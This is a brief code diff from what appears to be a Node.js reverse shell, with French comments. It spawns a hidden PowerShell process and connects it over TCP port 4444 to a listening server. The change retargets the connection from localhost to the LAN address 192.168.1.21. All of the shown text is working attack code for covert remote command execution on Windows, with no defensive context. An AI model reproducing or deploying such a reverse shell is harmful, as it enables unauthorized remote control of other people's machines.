@@ -7,7 +7,7 @@ const spawn = require('child_process').spawn;
 var process = spawn('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', {windowsHide: true})
 //process.unref()
 //on se connecte à l'adresse et au port sur le serveur d'écoute IPV4 UNIQUEMENT
-client.connect(4444, "127.0.0.1", function (err, socket) {
+client.connect(4444, "192.168.1.21", function (err, socket) {
     if (err) {
         console.error(err);
         return
